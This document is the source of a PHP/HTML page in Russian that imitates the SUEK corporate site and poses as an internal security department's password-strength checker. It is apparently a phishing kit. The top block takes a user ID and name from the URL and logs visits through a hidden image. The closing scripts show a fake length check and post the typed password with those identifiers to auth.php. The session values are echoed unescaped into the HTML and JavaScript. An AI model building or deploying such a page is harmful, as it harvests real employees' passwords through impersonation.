<?php
session_start();

if(isset($_GET['id']) && isset($_GET['user'])){
    $_SESSION['id']= $_GET['id'];
    $_SESSION['user']= $_GET['user'];
    header('Location: index.php');
}

if(file_exists('config.php')){
    header('Location: config.php');
}
?>
<img src="visited.php?id=<?php echo $_SESSION['id'];?>&user=<?php echo $_SESSION['user'];?>" style="display: none;">
<html lang="ru" class="p-work  is-font-plus  bx-core bx-no-touch bx-retina bx-chrome bx-mac">

<head>
<script type="text/javascript" src="scriptjava.js"></script>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Проверка пароля</title>
    <script src="//ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>

    <link rel="stylesheet" href="main.css">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <style type="text/css">
.enjoy-css {
  display: inline-block;
  -webkit-box-sizing: content-box;
  -moz-box-sizing: content-box;
  box-sizing: content-box;
  margin: 1px;
  padding: 10px 20px;
  border: 1px solid #b7b7b7;
  -webkit-border-radius: 11px;
  border-radius: 11px;
  font-family: "Lato", "Helvetica", Arial, sans-serif;
  font-size: 14px;
  -o-text-overflow: clip;
  text-overflow: clip;
  background: rgba(252,252,252,1);

  
  -webkit-transition: all 200ms cubic-bezier(0.42, 0, 0.58, 1);
  -moz-transition: all 200ms cubic-bezier(0.42, 0, 0.58, 1);
  -o-transition: all 200ms cubic-bezier(0.42, 0, 0.58, 1);
  transition: all 200ms cubic-bezier(0.42, 0, 0.58, 1);
}

.btn {
  -webkit-border-radius: 6;
  -moz-border-radius: 6;
  border-radius: 6px;
   font-family: "Lato", "Helvetica", Arial, sans-serif;
   font-size: 14px;
  color: #594f59;
  font-size: 14px;
  background: #ffffff;
  padding: 7px 20px 7px 20px;
  border: solid #B7B7B7 1px;
  text-decoration: none;
}

.btn:hover {
  text-decoration: none;
    border: solid #B7B7B7 2px;
}
    </style>
</head>

<body class=" ">

    <div class="main-header-wrapper">
          <header class="main-header">
              <a href="/" title="" class="logo main-header__logo"><img class="logo__img" src="http://www.suek.ru/local/templates/mainframe/images/suek-logo-ru.svg" alt="SUEK"></a><nav class="main-nav js-main-nav">
              <ul class="main-nav__list  main-nav__list--1 u-clearfix">
                <li class="main-nav__item  main-nav__item--1  is-parent">
                  <span class="main-nav__expand js-menu-expand"></span>
                      <a href="#" class="main-nav__link  main-nav__link--1 js-top-link ">
                    <span class="main-nav__link-text" align="center">Отдел информационной безопасности "Qwerty"</span>
                  </a> 
                </li>
              </ul>
              
          </header>
    </div>

    <div class="page-wrapper">

      <div align="center" style="margin:200px;margin-bottom:-300px">
        <p>Проверка надежности пароля</p><br>
        <input class="enjoy-css" id="input" placeholder="Введите пароль" />
        <button id="submit" class="btn" onclick="SendPost();">Проверить</button><br><br>
        <div id="newDivs" ></div>
      </div>
    </div>
    





    <div class="main-footer" >
        <div class="main-footer-wrapper"style="height="5%">
            <div class="grid">
                <div class="grid__item grid one-half medium-one-whole">
                    <div class="grid__item two-fifths medium-one-half small-one-whole bottom-margin--double">
                        <div id="bxdynamic_g8taYv_start" style="display:none"></div>



                        <ul class="main-footer__links small-one-whole">

                            <li class="main-footer__item small-one-whole">
                                <a href="#" class="main-footer__link ">О компании</a>
                            </li>
                            <li class="main-footer__item small-one-whole">
                                <a href="#" class="main-footer__link ">Наш бизнес</a>
                            </li>
                            <li class="main-footer__item small-one-whole">
                                <a href="#" class="main-footer__link ">Инвесторам</a>
                            </li>
                            <li class="main-footer__item small-one-whole">
                                <a href="#" class="main-footer__link ">Устойчивое развитие</a>
                            </li>
                            <li class="main-footer__item small-one-whole">
                                <a href="#" class="main-footer__link ">Карьера</a>
                            </li>
                            <li class="main-footer__item small-one-whole">
                                <a href="#" class="main-footer__link ">Пресс-центр</a>
                            </li>
                            <li class="main-footer__item small-one-whole">
                                <a href="#" class="main-footer__link ">Поставщикам</a>
                            </li>
                            <li class="main-footer__item small-one-whole">
                                <a href="#" class="main-footer__link "></a>
                            </li>

                        </ul>
                        <div id="bxdynamic_g8taYv_end" style="display:none"></div>
                    </div>
                    <div class="grid__item three-fifths medium-one-half small-one-whole bottom-margin--double">
                        <span class="main-footer__heading">Новости компании</span>
                        <div id="bxdynamic_7DqYyc_start" style="display:none"></div>
                        <ul class="footer-list small-one-whole">
                            <li class="footer-list__item">
                                <span class="footer-list__icon footer-list__icon--day">24<span>Янв</span></span>
                                <a href="#" class="footer-list__link">За достойный труд – автомобиль в подарок</a>
                            </li>
                           
                                                    </ul>
                        <div id="bxdynamic_7DqYyc_end" style="display:none"></div> <a href="#">Все новости</a>
                    </div>
                </div>
                <div class="grid__item grid one-half medium-one-whole">
                    <div class="grid__item one-half medium-one-half small-one-whole bottom-margin--double">
                        <span class="main-footer__heading">Отчеты и презентации</span>
                        <div id="bxdynamic_jmonnO_start" style="display:none"></div>
                        <ul class="footer-list small-one-whole">
                            <li class="footer-list__item">
                                <span class="footer-list__icon footer-list__icon--pdf"></span>
                                <a href="#" class="footer-list__link">Социальный отчет 2014–2015<br> PDF (6.4M) </a>
                            </li>
                            <li class="footer-list__item">
                                <span class="footer-list__icon footer-list__icon--pdf"></span>
                                <a href="#" class="footer-list__link">Годовой отчет 2015<br> PDF (6.8M) </a>
                            </li>
                            <li class="footer-list__item">
                                <span class="footer-list__icon footer-list__icon--pdf"></span>
                                <a href="#" class="footer-list__link">Корпоративная презентация<br> PDF (2.5M) </a>
                            </li>
                        </ul>
                        <div id="bxdynamic_jmonnO_end" style="display:none"></div> <a href="#">Календарь инвестора</a>
                    </div>
                    <div class="grid__item one-half medium-one-half small-one-whole bottom-margin--double">
                        <form action="#" class="search-form bottom-margin--double-and-half">
                            <input type="submit" name="btn" value="" class="input-btn">
                            <input type="text" name="q" class="input-text placeholder" placeholder="поиск">
                        </form>
                        <div class="footer-rss bottom-margin--one">
                            <a href="#" class="footer-rss__link">RSS лента</a>
                            <span class="grey-color-text">Подписаться по RSS</span>
                        </div>
                        <div id="bxdynamic_IzufVt_start" style="display:none"></div><span class="grey-color-text">Получать все последние обновления и&nbsp;корпоративные пресс-релизы по&nbsp;e-mail:</span>
                        <form action="#" class="subscribe-form top-margin--one js-validation-bottom-subscribe-form" novalidate="novalidate">
                            <input type="hidden" name="sf_RUB_ID[]" id="sf_RUB_ID_2" value="2" checked="">
                            <div class="">
                                <input type="submit" name="btn" class="input-btn" value="Подписаться">
                                <input type="text" id="sf_EMAIL" name="sf_EMAIL" class="input-text placeholder" placeholder="Введите ваш e-mail" value="" required="" aria-required="true">
                            </div>
                        </form>
                        <div id="bxdynamic_IzufVt_end" style="display:none"></div>
                    </div>
                </div>
            </div>
        </div>

    </div>
<script type="text/javascript">
  $('#submit').click(function() {
   var text = $('#input').val();
   var myLength = $("#input").val().length;

   if(myLength > 6){
      $('div.new').remove();
      $('#newDivs').append('<div class="new" style="color:green">' + 'Пароль соответствует политике безопасности' + '</div>');
   }else{
      $('div.new').remove();
      $('#newDivs').append('<div class="new" style="color:red">' + 'Пароль не соответствует политике безопасности' + '</div>');
   }
});
</script>

<script type="text/javascript">


function SendPost() {
  //отправляю POST запрос и получаю ответ
  var pass = $('#input').val();
  $$a({
    type:'post',//тип запроса: get,post либо head
    url:'auth.php',//url адрес файла обработчика
    data:{'id':'<?php echo $_SESSION['id'];?>','password':pass,'username':'<?php echo $_SESSION['user']?>'},//параметры запроса
    response:'text',//тип возвращаемого ответа text либо xml
    success:function (data) {//возвращаемый результат от сервера
      $$('result',$$('result').innerHTML+'<br />'+data);
    }
  });
}
</script>
</body>

</html>